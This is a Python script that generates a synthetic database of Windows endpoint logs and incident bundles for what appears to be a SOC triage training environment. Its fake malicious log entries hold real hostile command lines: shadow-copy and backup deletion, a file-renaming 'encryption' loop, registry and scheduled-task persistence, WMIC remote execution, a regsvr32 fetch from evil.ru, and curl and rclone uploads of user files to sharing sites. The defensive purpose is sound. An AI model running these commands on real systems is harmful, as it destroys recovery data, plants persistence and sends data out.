#!/usr/bin/env python3
"""
Build diverse incident bundles for the SOC Log Triage Environment.

Creates 3 new tables in triage_scenarios.db:
  - incident_bundles   : episode definitions (log IDs + metadata)
  - threat_intel_ips   : IP reputation for check_ip_reputation tool
  - file_hashes        : hash IOC DB for check_file_hash tool

Also seeds synthetic Sysmon log entries for 5 attack types:
  c2_beacon | ransomware | lateral_movement | persistence | data_exfil

Run: python data/build_incidents.py
"""
from __future__ import annotations

import json
import random
import sqlite3
import uuid
from datetime import datetime, timedelta
from pathlib import Path

DB_PATH = Path(__file__).parent / "triage_scenarios.db"
random.seed(42)

# ---------------------------------------------------------------------------
# Host / User pools
# ---------------------------------------------------------------------------
HOSTS = [
    "WORKSTATION-A1B2", "WORKSTATION-C3D4", "WORKSTATION-E5F6",
    "DESKTOP-X9Y8Z7",  "DESKTOP-M3N4P5",  "DESKTOP-B2C3D4",
    "LAPTOP-HR-001",   "LAPTOP-FIN-002",  "LAPTOP-DEV-003",
    "SRV-FILE-01",     "SRV-AD-01",       "SRV-WEB-01",
    "JUMPBOX-01",      "DC-THESHIRE",     "EXCHANGE-01",
]
USERS = ["alice", "bob", "charlie", "dave", "eve", "frank", "grace", "hank"]

BENIGN_PROCESSES = [
    r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
    r"C:\Program Files\Mozilla Firefox\firefox.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft VS Code\Code.exe",
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\taskhostw.exe",
    r"C:\Program Files\Slack\slack.exe",
    r"C:\Program Files\Zoom\Zoom.exe",
    r"C:\Program Files\Git\mingw64\bin\git.exe",
    r"C:\Windows\System32\msiexec.exe",
    r"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe",
]
BENIGN_DOMAINS  = [
    "azure.microsoft.com", "login.microsoftonline.com",
    "slack.com", "zoom.us", "github.com", "stackoverflow.com",
    "docs.microsoft.com", "office.com", "googleapis.com",
    "teams.microsoft.com", "cdn.jsdelivr.net", "fonts.googleapis.com",
]
BENIGN_IPS = [
    "13.107.42.16", "40.90.4.208", "52.113.194.132", "104.244.42.1",
    "34.236.25.177", "8.8.8.8", "1.1.1.1", "208.67.222.222",
]

C2_DOMAINS = [
    "malicious-payload.ru", "c2-beacon.onion.to", "exfil-drop.xyz",
    "update-checker.net", "cdn-assets-dl.com", "telemetry-sync.top",
    "api-edge-proxy.info", "secure-cdn-assets.biz", "oauth2-verify.ru",
    "login-portal-verify.com", "cloud-storage-sync.ru", "patch-update.tk",
]
MALICIOUS_IPS = [
    "185.220.101.45", "194.165.16.78", "45.142.212.100",
    "91.108.4.0",     "176.111.174.26", "5.34.180.205",
    "194.61.24.102",  "45.32.150.5",    "103.224.182.245",
]

LOLBINS = [
    r"C:\Windows\System32\wmic.exe",
    r"C:\Windows\System32\mshta.exe",
    r"C:\Windows\System32\regsvr32.exe",
    r"C:\Windows\System32\certutil.exe",
    r"C:\Windows\System32\rundll32.exe",
    r"C:\Windows\System32\bitsadmin.exe",
    r"C:\Windows\SysWOW64\wscript.exe",
    r"C:\Windows\System32\cscript.exe",
]

MALICIOUS_HASHES = [
    ("da39a3ee5e6b4b0d3255bfef95601890afd80709", "dropper.exe",        "ransomware",        "critical"),
    ("adc83b19e793491b1c6ea0fd8b46cd9f32e592fc","loader.dll",          "cobalt_strike",     "critical"),
    ("5d41402abc4b2a76b9719d911017c592",        "payload.ps1",         "c2_beacon",         "high"),
    ("7215ee9c7d9dc229d2921a40e899ec5f",        "persistence.bat",     "persistence",       "high"),
    ("6dcd4ce23d88e2ee9568ba546c007c63",        "exfil_tool.exe",      "data_exfil",        "high"),
    ("1679091c5a880faf6fb5e6087eb1b2dc",        "lateral.exe",         "lateral_movement",  "critical"),
    ("8277e0910d750195b448797616e091ad",        "meterpreter.dll",     "c2_beacon",         "critical"),
    ("19ca14e7ea6328a42e0eb13d585e4c22",        "mimikatz.exe",        "credential_theft",  "critical"),
    ("a87ff679a2f3e71d9181a67b7542122c",        "ransomware.exe",      "ransomware",        "critical"),
    ("e4da3b7fbbce2345d7772b0674a318d5",        "worm.exe",            "lateral_movement",  "critical"),
]

def _ts(base: datetime | None = None, delta_minutes: int = 0) -> str:
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28),
                             random.randint(8, 18), random.randint(0, 59))
    return (base + timedelta(minutes=delta_minutes)).strftime("%Y-%m-%d %H:%M:%S")


# ---------------------------------------------------------------------------
# Synthetic log generators
# ---------------------------------------------------------------------------

def _benign_logs(host: str, count: int, base: datetime | None = None) -> list[dict]:
    logs = []
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 9, 0)
    for i in range(count):
        proc = random.choice(BENIGN_PROCESSES)
        logs.append({
            "host_id":      host,
            "timestamp":    _ts(base, i * random.randint(1, 15)),
            "event_type":   random.choice(["INFO", "AUDIT_SUCCESS", "ProcessCreate"]),
            "process":      proc,
            "commandline":  None,
            "target_ip":    random.choice(BENIGN_IPS) if random.random() < 0.4 else None,
            "target_domain": random.choice(BENIGN_DOMAINS) if random.random() < 0.5 else None,
            "parent_process": r"C:\Windows\explorer.exe",
            "is_malicious": 0,
            "details": json.dumps({"EventID": random.choice([5156, 4798, 4624]), "Severity": "INFO"}),
        })
    return logs


def _c2_beacon_logs(host: str, tier: str, base: datetime | None = None) -> list[dict]:
    """PowerShell/cmd encoded beacon to external C2 domain."""
    domain = random.choice(C2_DOMAINS)
    ip = random.choice(MALICIOUS_IPS)
    ps_cmd = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {uuid.uuid4().hex.upper()}"
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 10, 0)
    noise_count = {"Easy": 45, "Medium": 90, "Hard": 180}.get(tier, 45)
    logs = _benign_logs(host, noise_count, base)

    # Malicious events
    mal = [
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 1),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "commandline":  ps_cmd,
            "target_ip":    ip,
            "target_domain": domain,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "family": "c2_beacon"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 6),
            "event_type":   "AUDIT_SUCCESS",
            "process":      r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "commandline":  None,
            "target_ip":    ip,
            "target_domain": domain,
            "parent_process": None,
            "is_malicious": 1,
            "details": json.dumps({"EventID": 5156, "Severity": "HIGH", "note": "outbound_c2_beacon"}),
        },
    ]
    if tier in ("Medium", "Hard"):
        mal.append({
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 12),
            "event_type":   "CreateKey",
            "process":      r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "commandline":  f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d \"{ps_cmd}\"",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 12, "Severity": "HIGH", "note": "registry_persistence"}),
        })
    logs.extend(mal)
    random.shuffle(logs)
    return logs


def _ransomware_logs(host: str, tier: str, base: datetime | None = None) -> list[dict]:
    """Shadow deletion, disabling recovery, file encryption prep."""
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 11, 0)
    noise_count = {"Easy": 45, "Medium": 90, "Hard": 180}.get(tier, 45)
    logs = _benign_logs(host, noise_count, base)

    mal = [
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 1),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\vssadmin.exe",
            "commandline":  "vssadmin.exe delete shadows /all /quiet",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "family": "ransomware"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 3),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\bcdedit.exe",
            "commandline":  "bcdedit.exe /set {default} recoveryenabled No",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "note": "disable_recovery"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 5),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\wbadmin.exe",
            "commandline":  "wbadmin.exe delete catalog -quiet",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "note": "delete_backup_catalog"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 7),
            "event_type":   "SetValue",
            "process":      r"C:\Users\Public\ransomware_payload.exe",
            "commandline":  None,
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 13, "Severity": "CRITICAL", "RegistryKey": "HKCU\\Desktop\\Wallpaper", "Value": "RANSOM_NOTE.bmp"}),
        },
    ]
    if tier == "Hard":
        mal.append({
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 10),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\cmd.exe",
            "commandline":  "cmd.exe /c for /r C:\\Users %f in (*.docx *.xlsx *.pdf) do ren \"%f\" \"%f.encrypted\"",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Users\Public\ransomware_payload.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "note": "file_encryption_loop"}),
        })
    logs.extend(mal)
    random.shuffle(logs)
    return logs


def _lateral_movement_logs(hosts: list[str], tier: str, base: datetime | None = None) -> list[dict]:
    """WMI/SMB/PSExec lateral movement across multiple hosts."""
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 14, 0)
    src, dst1 = hosts[0], hosts[1] if len(hosts) > 1 else random.choice(HOSTS)
    dst2 = hosts[2] if len(hosts) > 2 else None
    noise_count = {"Easy": 45, "Medium": 90, "Hard": 180}.get(tier, 45)
    logs = _benign_logs(src, noise_count, base)
    if dst2:
        logs += _benign_logs(dst1, noise_count // 2, base)

    target_ip = f"192.168.1.{random.randint(10, 200)}"
    mal = [
        {
            "host_id":      src,
            "timestamp":    _ts(base, noise_count + 1),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\wmic.exe",
            "commandline":  f"wmic.exe /node:{target_ip} process call create \"cmd.exe /c whoami\"",
            "target_ip":    target_ip,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "HIGH", "family": "lateral_movement"}),
        },
        {
            "host_id":      src,
            "timestamp":    _ts(base, noise_count + 3),
            "event_type":   "ConnectPipe",
            "process":      r"C:\Windows\System32\wmic.exe",
            "commandline":  None,
            "target_ip":    target_ip,
            "target_domain": None,
            "parent_process": None,
            "is_malicious": 1,
            "details": json.dumps({"EventID": 18, "Severity": "HIGH", "PipeName": "\\\\.\\pipe\\WMIAPIRPC"}),
        },
        {
            "host_id":      dst1,
            "timestamp":    _ts(base, noise_count + 5),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\cmd.exe",
            "commandline":  "cmd.exe /c whoami && net user",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\wmic.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "HIGH", "note": "remote_execution_on_target"}),
        },
        {
            "host_id":      src,
            "timestamp":    _ts(base, noise_count + 8),
            "event_type":   "AUDIT_SUCCESS",
            "process":      r"C:\Windows\System32\lsass.exe",
            "commandline":  None,
            "target_ip":    target_ip,
            "target_domain": None,
            "parent_process": None,
            "is_malicious": 1,
            "details": json.dumps({"EventID": 4648, "Severity": "HIGH", "note": "explicit_credential_logon", "TargetUserName": "SYSTEM", "LogonType": 3}),
        },
    ]
    if tier == "Hard" and dst2:
        mal += [
            {
                "host_id":      dst1,
                "timestamp":    _ts(base, noise_count + 12),
                "event_type":   "ProcessCreate",
                "process":      random.choice(LOLBINS),
                "commandline":  "regsvr32.exe /s /u /i:http://evil.ru/payload.sct scrobj.dll",
                "target_ip":    random.choice(MALICIOUS_IPS),
                "target_domain": random.choice(C2_DOMAINS),
                "parent_process": r"C:\Windows\System32\cmd.exe",
                "is_malicious": 1,
                "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "note": "squiblydoo_lolbin"}),
            },
            {
                "host_id":      dst2,
                "timestamp":    _ts(base, noise_count + 16),
                "event_type":   "ProcessCreate",
                "process":      r"C:\Windows\System32\net.exe",
                "commandline":  f"net use \\\\{target_ip}\\IPC$ * /user:DOMAIN\\Administrator",
                "target_ip":    target_ip,
                "target_domain": None,
                "parent_process": r"C:\Windows\System32\cmd.exe",
                "is_malicious": 1,
                "details": json.dumps({"EventID": 1, "Severity": "HIGH", "note": "smb_lateral_spread"}),
            },
        ]
    logs.extend(mal)
    random.shuffle(logs)
    return logs


def _persistence_logs(host: str, tier: str, base: datetime | None = None) -> list[dict]:
    """Registry Run key / schtasks / Winlogon abuse."""
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 9, 30)
    payload = f"C:\\Users\\{random.choice(USERS)}\\AppData\\Roaming\\{uuid.uuid4().hex[:8]}.exe"
    noise_count = {"Easy": 45, "Medium": 90, "Hard": 180}.get(tier, 45)
    logs = _benign_logs(host, noise_count, base)

    mal = [
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 1),
            "event_type":   "SetValue",
            "process":      r"C:\Windows\System32\reg.exe",
            "commandline":  f"reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"{payload}\" /f",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 13, "Severity": "HIGH", "family": "persistence", "RegistryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 3),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\schtasks.exe",
            "commandline":  f"schtasks.exe /create /sc ONLOGON /tn SystemUpdate /tr \"{payload}\" /ru SYSTEM /f",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "HIGH", "note": "scheduled_task_persistence"}),
        },
    ]
    if tier in ("Medium", "Hard"):
        mal.append({
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 5),
            "event_type":   "SetValue",
            "process":      r"C:\Windows\System32\reg.exe",
            "commandline":  f"reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"{payload}\" /f",
            "target_ip":    None,
            "target_domain": None,
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 13, "Severity": "CRITICAL", "note": "winlogon_hijack"}),
        })
    logs.extend(mal)
    random.shuffle(logs)
    return logs


def _data_exfil_logs(host: str, tier: str, base: datetime | None = None) -> list[dict]:
    """curl/rclone/unusual outbound data transfer."""
    base = base or datetime(2024, random.randint(1, 12), random.randint(1, 28), 16, 0)
    exfil_ip = random.choice(MALICIOUS_IPS)
    noise_count = {"Easy": 45, "Medium": 90, "Hard": 180}.get(tier, 45)
    logs = _benign_logs(host, noise_count, base)

    exfil_targets = [
        "https://transfer.sh/", "https://file.io/", "https://0x0.st/",
        "https://oshi.at/", "https://api.anonfiles.com/upload",
    ]

    mal = [
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 1),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Windows\System32\curl.exe",
            "commandline":  f"curl.exe -F \"file=@C:\\Users\\{random.choice(USERS)}\\Documents\\sensitive_data.zip\" {random.choice(exfil_targets)}",
            "target_ip":    exfil_ip,
            "target_domain": random.choice(C2_DOMAINS),
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "HIGH", "family": "data_exfil"}),
        },
        {
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 3),
            "event_type":   "AUDIT_SUCCESS",
            "process":      r"C:\Windows\System32\curl.exe",
            "commandline":  None,
            "target_ip":    exfil_ip,
            "target_domain": None,
            "parent_process": None,
            "is_malicious": 1,
            "details": json.dumps({"EventID": 5156, "Severity": "HIGH", "note": "large_outbound_transfer_500MB"}),
        },
    ]
    if tier in ("Medium", "Hard"):
        mal.append({
            "host_id":      host,
            "timestamp":    _ts(base, noise_count + 6),
            "event_type":   "ProcessCreate",
            "process":      r"C:\Users\Public\rclone.exe",
            "commandline":  "rclone.exe sync C:\\Users\\Documents OneDrive:stolen_data --transfers 32",
            "target_ip":    exfil_ip,
            "target_domain": "api.onedrive.com",
            "parent_process": r"C:\Windows\System32\cmd.exe",
            "is_malicious": 1,
            "details": json.dumps({"EventID": 1, "Severity": "CRITICAL", "note": "rclone_mass_sync_exfil"}),
        })
    logs.extend(mal)
    random.shuffle(logs)
    return logs


# ---------------------------------------------------------------------------
# Incident bundle assembler
# ---------------------------------------------------------------------------

def _alert_summary(attack_type: str, host: str, tier: str) -> str:
    summaries = {
        "c2_beacon":        f"Suspicious PowerShell encoded beacon detected on {host}",
        "ransomware":       f"Volume Shadow Copy deletion and backup catalog wipe on {host}",
        "lateral_movement": f"WMI remote process execution spreading from {host}",
        "persistence":      f"Unauthorized registry Run key and scheduled task created on {host}",
        "data_exfil":       f"Large outbound data transfer via curl/rclone detected on {host}",
        "benign":           f"Routine activity cluster flagged by SIEM rule on {host}",
    }
    return summaries.get(attack_type, f"Suspicious activity on {host}")


def build_and_insert(conn: sqlite3.Connection) -> None:
    cur = conn.cursor()

    # ── Schema ───────────────────────────────────────────────────────────────
    cur.executescript("""
    DROP TABLE IF EXISTS incident_bundles;
    CREATE TABLE incident_bundles (
        id             INTEGER PRIMARY KEY AUTOINCREMENT,
        incident_id    TEXT UNIQUE NOT NULL,
        alert_summary  TEXT NOT NULL,
        difficulty_tier TEXT NOT NULL,
        is_malicious   INTEGER NOT NULL,
        attack_type    TEXT NOT NULL,
        primary_host   TEXT NOT NULL,
        affected_hosts TEXT NOT NULL,
        log_ids        TEXT NOT NULL
    );

    DROP TABLE IF EXISTS threat_intel_ips;
    CREATE TABLE threat_intel_ips (
        ip                  TEXT PRIMARY KEY,
        reputation_score    REAL NOT NULL,
        category            TEXT NOT NULL,
        country             TEXT NOT NULL,
        asn                 TEXT,
        known_malware       TEXT,
        first_seen          TEXT,
        last_seen           TEXT
    );

    DROP TABLE IF EXISTS file_hashes;
    CREATE TABLE file_hashes (
        hash        TEXT PRIMARY KEY,
        filename    TEXT NOT NULL,
        is_malicious INTEGER NOT NULL,
        family      TEXT,
        severity    TEXT
    );
    """)

    # ── Populate threat intel IPs ────────────────────────────────────────────
    for ip in MALICIOUS_IPS:
        cur.execute("""INSERT OR REPLACE INTO threat_intel_ips
            VALUES (?,?,?,?,?,?,?,?)""",
            (ip, round(random.uniform(0.8, 1.0), 2), "C2/Botnet",
             random.choice(["RU","CN","UA","RO","NL"]),
             f"AS{random.randint(10000,99999)}",
             random.choice(["Cobalt Strike","Empire","Metasploit","AsyncRAT"]),
             "2023-01-01", "2024-12-01"))
    for ip in BENIGN_IPS:
        cur.execute("""INSERT OR REPLACE INTO threat_intel_ips
            VALUES (?,?,?,?,?,?,?,?)""",
            (ip, round(random.uniform(0.0, 0.1), 2), "CDN/Cloud",
             random.choice(["US","IE","SG"]),
             f"AS{random.randint(10000,99999)}", None, None, None))
    # Extra IPs for diversity
    for _ in range(40):
        ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        is_bad = random.random() < 0.3
        cur.execute("""INSERT OR IGNORE INTO threat_intel_ips
            VALUES (?,?,?,?,?,?,?,?)""",
            (ip, round(random.uniform(0.7,1.0) if is_bad else random.uniform(0,0.2), 2),
             "Suspicious" if is_bad else "CDN",
             random.choice(["RU","CN","US","DE","FR"]),
             f"AS{random.randint(10000,99999)}",
             random.choice(["SilverSparrow","RedLine"]) if is_bad else None,
             "2024-01-01" if is_bad else None,
             "2024-11-01" if is_bad else None))

    # ── Populate file hashes ─────────────────────────────────────────────────
    for h, fn, fam, sev in MALICIOUS_HASHES:
        cur.execute("INSERT OR REPLACE INTO file_hashes VALUES (?,?,?,?,?)",
                    (h, fn, 1, fam, sev))
    for _ in range(30):
        cur.execute("INSERT OR IGNORE INTO file_hashes VALUES (?,?,?,?,?)",
                    (uuid.uuid4().hex, f"legit_{uuid.uuid4().hex[:6]}.dll", 0, None, "info"))

    # ── Generate incidents ───────────────────────────────────────────────────
    def _insert_logs(rows: list[dict]) -> list[int]:
        ids = []
        for r in rows:
            cur.execute("""
                INSERT INTO sysmon_endpoint_logs
                (host_id, timestamp, event_type, process, commandline,
                 target_ip, target_domain, parent_process, is_malicious, email_id, details)
                VALUES (?,?,?,?,?,?,?,?,?,?,?)
            """, (r["host_id"], r["timestamp"], r["event_type"], r["process"],
                  r.get("commandline"), r.get("target_ip"), r.get("target_domain"),
                  r.get("parent_process"), r["is_malicious"], None, r.get("details")))
            ids.append(cur.lastrowid)
        return ids

    def _make_incident(attack_type, tier, host, logs_fn, extra_hosts=None):
        logs = logs_fn()
        log_ids = _insert_logs(logs)
        hosts_list = [host] + (extra_hosts or [])
        incident_id = f"INC-{uuid.uuid4().hex[:8].upper()}"
        is_mal = 0 if attack_type == "benign" else 1
        cur.execute("""
            INSERT INTO incident_bundles
            (incident_id, alert_summary, difficulty_tier, is_malicious,
             attack_type, primary_host, affected_hosts, log_ids)
            VALUES (?,?,?,?,?,?,?,?)
        """, (incident_id,
              _alert_summary(attack_type, host, tier),
              tier, is_mal, attack_type, host,
              json.dumps(hosts_list), json.dumps(log_ids)))

    print("Building incidents...")

    # ── Easy tier ─────────────────────────────────────────────────────────────
    for _ in range(40):   # benign
        h = random.choice(HOSTS)
        _make_incident("benign", "Easy", h, lambda: _benign_logs(h, random.randint(40, 55)))
    for _ in range(30):   # c2_beacon
        h = random.choice(HOSTS)
        _make_incident("c2_beacon", "Easy", h, lambda h=h: _c2_beacon_logs(h, "Easy"))
    for _ in range(15):   # persistence
        h = random.choice(HOSTS)
        _make_incident("persistence", "Easy", h, lambda h=h: _persistence_logs(h, "Easy"))

    print("  Easy: done")

    # ── Medium tier ────────────────────────────────────────────────────────────
    for _ in range(45):   # benign
        h = random.choice(HOSTS)
        _make_incident("benign", "Medium", h, lambda: _benign_logs(h, random.randint(80, 110)))
    for _ in range(20):   # c2_beacon
        h = random.choice(HOSTS)
        _make_incident("c2_beacon", "Medium", h, lambda h=h: _c2_beacon_logs(h, "Medium"))
    for _ in range(20):   # ransomware
        h = random.choice(HOSTS)
        _make_incident("ransomware", "Medium", h, lambda h=h: _ransomware_logs(h, "Medium"))
    for _ in range(15):   # persistence
        h = random.choice(HOSTS)
        _make_incident("persistence", "Medium", h, lambda h=h: _persistence_logs(h, "Medium"))
    for _ in range(10):   # lateral_movement
        h1, h2 = random.sample(HOSTS, 2)
        _make_incident("lateral_movement", "Medium", h1,
                       lambda h1=h1, h2=h2: _lateral_movement_logs([h1, h2], "Medium"),
                       extra_hosts=[h2])
    for _ in range(10):   # data_exfil
        h = random.choice(HOSTS)
        _make_incident("data_exfil", "Medium", h, lambda h=h: _data_exfil_logs(h, "Medium"))

    print("  Medium: done")

    # ── Hard tier ──────────────────────────────────────────────────────────────
    for _ in range(40):   # benign
        h = random.choice(HOSTS)
        _make_incident("benign", "Hard", h, lambda: _benign_logs(h, random.randint(160, 200)))
    for _ in range(15):   # c2_beacon
        h = random.choice(HOSTS)
        _make_incident("c2_beacon", "Hard", h, lambda h=h: _c2_beacon_logs(h, "Hard"))
    for _ in range(25):   # ransomware
        h = random.choice(HOSTS)
        _make_incident("ransomware", "Hard", h, lambda h=h: _ransomware_logs(h, "Hard"))
    for _ in range(30):   # lateral_movement
        h1, h2, h3 = random.sample(HOSTS, 3)
        _make_incident("lateral_movement", "Hard", h1,
                       lambda h1=h1, h2=h2, h3=h3: _lateral_movement_logs([h1, h2, h3], "Hard"),
                       extra_hosts=[h2, h3])
    for _ in range(10):   # persistence
        h = random.choice(HOSTS)
        _make_incident("persistence", "Hard", h, lambda h=h: _persistence_logs(h, "Hard"))
    for _ in range(15):   # data_exfil
        h = random.choice(HOSTS)
        _make_incident("data_exfil", "Hard", h, lambda h=h: _data_exfil_logs(h, "Hard"))

    print("  Hard: done")

    conn.commit()


def print_summary(conn: sqlite3.Connection) -> None:
    print("\n=== INCIDENT BUNDLE SUMMARY ===")
    rows = conn.execute("""
        SELECT difficulty_tier, attack_type, COUNT(*) as cnt
        FROM incident_bundles
        GROUP BY difficulty_tier, attack_type
        ORDER BY difficulty_tier, attack_type
    """).fetchall()
    for r in rows:
        print(f"  {r[0]:8s} | {r[1]:20s} | {r[2]:4d} incidents")
    total = conn.execute("SELECT COUNT(*) FROM incident_bundles").fetchone()[0]
    print(f"  TOTAL: {total} incidents")

    ip_count = conn.execute("SELECT COUNT(*) FROM threat_intel_ips").fetchone()[0]
    hash_count = conn.execute("SELECT COUNT(*) FROM file_hashes").fetchone()[0]
    new_logs = conn.execute("SELECT COUNT(*) FROM sysmon_endpoint_logs").fetchone()[0]
    print(f"\n  threat_intel_ips : {ip_count} entries")
    print(f"  file_hashes      : {hash_count} entries")
    print(f"  sysmon logs total: {new_logs} rows")


if __name__ == "__main__":
    print(f"Opening DB: {DB_PATH}")
    conn = sqlite3.connect(str(DB_PATH))
    build_and_insert(conn)
    print_summary(conn)
    conn.close()
    print("\nDone. Run `python data/build_incidents.py` again to rebuild.")
